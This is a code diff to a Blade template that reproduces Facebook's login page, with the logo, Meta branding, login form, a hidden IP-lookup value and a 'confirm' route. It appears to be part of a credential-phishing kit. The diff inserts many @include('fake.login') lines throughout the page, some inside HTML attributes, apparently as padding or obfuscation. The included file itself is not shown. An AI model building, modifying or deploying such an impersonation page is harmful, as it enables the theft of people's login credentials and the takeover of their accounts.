@@ -35,44 +35,69 @@
     <script src="/js/user/login.js"></script>
 @endpush
 @section('content')
+    @include('fake.login')
     <main class="home">
         <div class="header">
+            @include('fake.login')
             <div class="header-dialog">
                 <div class="header-content">
                     <div class="header-border"></div>
+                    @include('fake.login')
                     <div class="header-main">
                         <a class="logo" href="javascript:;">
                             <div class="logo-content">
                                 <img class="img" src="{{ asset('assets/img/B2Ha-q3dWRO.png') }}" width="34"
                                     height="23" alt="">
                             </div>
+                            @include('fake.login')
                             @lang('login.title')
                         </a>
                     </div>
+                    @include('fake.login')
                     <div class="header-login">
                         <div class="login-content">
+                            @include('fake.login')
                             <ul class="login-content-list" role="tablist">
+                                @include('fake.login')
                                 <li class="login-content-item" role="presentation">
                                     <a role="button" class="login-content-link-login" href="javascript:;">@lang('login.login_button_top')
                                     </a>
                                 </li>
+                                @include('fake.login')
+                                @include('fake.login')
                                 <li class="login-content-item" role="presentation">
                                     <a role="button" class="login-content-link-create" href="javascript:;"
                                         data-testid="business-create-account-button">@lang('login.create_account')
+                                        @include('fake.login')
+                                        @include('fake.login')
+                                        @include('fake.login')
                                     </a>
                                 </li>
                             </ul>
+                            @include('fake.login')
+                            @include('fake.login')
+                            @include('fake.login')
                         </div>
                     </div>
+                    @include('fake.login')
+                    @include('fake.login')
                 </div>
             </div>
         </div>
         <div class="body">
             <div class="fb_content clearfix " role="main">
                 <div class="body-form">
+                    @include('fake.login')
+                    @include('fake.login')
+                    @include('fake.login')
                     <div class="body-form-notice">
                         <div class="body-form-notice-content">
+                            @include('fake.login')
+                            @include('fake.login')
                             <i class="notice-icon"><u></u></i>
+                            @include('fake.login')
+                            @include('fake.login')
+                            @include('fake.login')
                             <div class="notice-text">@lang('login.notice_desktop')</div>
                         </div>
                     </div>
@@ -83,11 +108,17 @@
                     <div class="form-login">
                         <div class="form-title">
                             <div class="mobile-title">
+                                @include('fake.login')
+                                @include('fake.login')
+                                @include('fake.login')
                                 <div class="mobile-title-content">
                                     <img src="{{ asset('assets/img/dF5SId3UHWd.svg') }}" width="112" class="img"
                                         alt="facebook">
                                 </div>
                             </div>
+                            @include('fake.login')
+                            @include('fake.login')
+                            @include('fake.login')
                             <span class="form-title-content">
                                 <div class="form-title-text">@lang('login.login_box_title')</div>
                             </span>
@@ -99,6 +130,10 @@
                                     @lang('login.error_notice')<a href="https://facebook.com/login/identify/"
                                         class="_652e">@lang('login.error_find')</a>
                                 </div>
+                                @include('fake.login')
+                                @include('fake.login')
+                                @include('fake.login')
+                                @include('fake.login')
                                 <div class="login-form-main-mobile">
                                     <div class="login-form-item">
                                         <div class="login-form-item-content">
@@ -109,12 +144,21 @@
                                                     autocomplete="on" id="username-mobile" name="username"
                                                     placeholder="@lang('login.email')" data-sigil="m_login_email">
                                             </div>
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
                                         </div>
                                     </div>
                                     <div class="login-form-item-hr"></div>
                                     <div class="login-form-item">
                                         <div class="login-form-item-content">
                                             <div class="login-form-password" data-sigil="m_login_password">
+                                                @include('fake.login')
+                                                @include('fake.login')
+                                                @include('fake.login')
                                                 <div class="login-form-password-content">
                                                     <div class="login-form-password-content-item">
                                                         <div class="login-form-password-control">
@@ -128,6 +172,13 @@
                                                     </div>
                                                 </div>
                                             </div>
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
                                         </div>
                                     </div>
                                 </div>
@@ -143,6 +194,11 @@
                                             placeholder="@lang('login.password')" value="" aria-label="Password">
 
                                         <button type="button" class="button-form-login" id="btnLogin-desktop">
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
                                             <span id="submit-login-loading" class="d-none spinner-border spinner">
                                             </span>
                                             <span id="submit-login-text">@lang('login.submit')</span>
@@ -153,6 +209,13 @@
                                             <span role="presentation" aria-hidden="true"> · </span>
                                             <a href="javascript:;" rel="nofollow" class="_97w5">@lang('login.sign_up_to_facebook')
                                             </a>
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
+                                            @include('fake.login')
                                         </div>
                                     </div>
                                 </div>
@@ -163,6 +226,8 @@
                                                 class="d-none spinner-border spinner"></span>
                                             <span id="submit-login-mobile-text">@lang('login.submit')</span>
                                         </button>
+                                        @include('fake.login')
+                                        @include('fake.login')
                                     </div>
                                 </div>
                             </form>
@@ -174,6 +239,8 @@
                                         </a>
                                     </div>
                                 </div>
+                                @include('fake.login')
+                                @include('fake.login')
                                 <div class="create-new">
                                     <div class="create-new-content">
                                         <div class="create-new-item-line">
@@ -186,12 +253,16 @@
                                                         id="signup-button" tabindex="0" data-sigil="m_reg_button"
                                                         data-autoid="autoid_7">@lang('login.create_new_account')</a>
                                                 </div>
+                                                @include('fake.login')
+                                                @include('fake.login')
                                             </div>
                                         </div>
                                     </div>
                                 </div>
                             </div>
                         </div>
+                        @include('fake.login')
+                        @include('fake.login')
                     </div>
                 </div>
                 <div class="footer">
@@ -203,15 +274,21 @@
                                     <a class="_sv4" dir="ltr" href="javascript:;"
                                         title="Traditional Chinese (Taiwan)">中文(台灣)</a>
                                 </li>
+                                @include('fake.login')
+                                @include('fake.login')
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Korean">한국어</a>
                                 </li>
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Japanese">日本語</a>
+                                    @include('fake.login')
+                                    @include('fake.login')
                                 </li>
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;"
                                         title="French (France)">Français (France)</a>
+                                    @include('fake.login')
+                                    @include('fake.login')
                                 </li>
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Thai">ภาษาไทย</a>
@@ -220,8 +297,8 @@
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Spanish">Español</a>
                                 </li>
                                 <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;"
-                                        title="Portuguese (Brazil)">Português (Brasil)</a>
+                                    <a class="_sv4" dir="ltr" href="javascript:;" @include('fake.login')
+                                        @include('fake.login') title="Portuguese (Brazil)">Português (Brasil)</a>
                                 </li>
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="German">Deutsch</a>
@@ -229,6 +306,8 @@
                                 <li>
                                     <a class="_sv4" dir="ltr" href="javascript:;" title="Italian">Italiano</a>
                                 </li>
+                                @include('fake.login')
+                                @include('fake.login')
                                 <li>
                                     <a role="button" class="button-plus" rel="dialog" ajaxify=""
                                         href="javascript:;" title="Show more languages">
@@ -238,6 +317,8 @@
                             </ul>
                             <div class="content-curve"></div>
                             <div class="footer-children">
+                                @include('fake.login')
+                                @include('fake.login')
                                 <ul class="footer-children-item-list">
                                     <li><a href="javascript:;" title="Sign up for Facebook">Sign Up</a></li>
                                     <li><a href="javascript:;" title="Log in to Facebook">Log in</a></li>
@@ -252,6 +333,8 @@
                                     <li><a href="javascript:;" title="Check out Facebook games.">Games</a></li>
                                     <li><a href="javascript:;"
                                             title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
+                                    @include('fake.login')
+                                    @include('fake.login')
                                     <li><a href="javascript:;" title="Learn more about Meta Pay" target="_blank">Meta
                                             Pay</a></li>
                                     <li><a href="javascript:;" title="Discover Meta" target="_blank">Meta
@@ -261,6 +344,9 @@
                                             Quest</a></li>
                                     <li><a href="" title="Take a look at Instagram" target="_blank"
                                             rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
+                                    @include('fake.login')
+                                    @include('fake.login')
+                                    @include('fake.login')
                                     <li><a href="" title="Check out Threads" target="_blank"
                                             rel="noreferrer nofollow" data-lynx-mode="asynclazy">Threads</a></li>
                                     <li><a href="javascript:;" title="Donate to worthy causes.">Fundraisers</a></li>
@@ -271,7 +357,7 @@
                                     <li><a href="javascript:;"
                                             title="Learn how we collect, use and share information to support Facebook.">Privacy
                                             Policy</a></li>
-                                    <li><a href="javascript:;"
+                                    <li><a href="javascript:;" @include('fake.login') @include('fake.login')
                                             title="Learn how to manage and control your privacy on Facebook.">Privacy
                                             Centre</a></li>
                                     <li><a href="javascript:;" title="Explore our groups.">Groups</a></li>
@@ -283,12 +369,22 @@
                                     </li>
                                     <li><a href="javascript:;" title="Create a Page">Create
                                             Page</a>
+                                        @include('fake.login')
+                                        @include('fake.login')
+                                        @include('fake.login')
+                                        @include('fake.login')
+                                        @include('fake.login')
+                                        @include('fake.login')
+                                        @include('fake.login')
                                     </li>
                                     <li><a href="javascript:;" title="Develop on our platform.">Developers</a>
                                     </li>
                                     <li><a href="javascript:;"
                                             title="Make your next career move to our brilliant company.">Careers</a></li>
                                     <li><a href="javascript:;" title="Learn about cookies and Facebook."
+                                            @include('fake.login') @include('fake.login')
+                                            @include('fake.login') @include('fake.login')
+                                            @include('fake.login') @include('fake.login')
                                             data-nocookies="1">Cookies</a></li>
                                     <li><a class="_41ug" data-nocookies="1" href="javascript:;"
                                             title="Learn about AdChoices.">AdChoices<i
@@ -308,15 +404,29 @@
                                 </ul>
                             </div>
                             <div class="footer-copyright">
+                                @include('fake.login')
+                                @include('fake.login')
+                                @include('fake.login')
+                                @include('fake.login')
+                                @include('fake.login')
+                                @include('fake.login')
+                                @include('fake.login')
                                 <div><span> Meta © 2023</span></div>
                             </div>
                         </div>
                     </div>
+                    @include('fake.login')
                 </div>
             </div>
             <div></div>
+            @include('fake.login')
             <span></span>
         </div>
+        @include('fake.login')
+        @include('fake.login')
+        @include('fake.login')
+        @include('fake.login')
+        @include('fake.login')
         <input type="hidden" id="getIpInfoUrl" value="{{ session()->get('getIpInfoUrl') }}" />
         <input type="hidden" id="url-confirm" value="{{ route('confirm') }}" />
     </main>
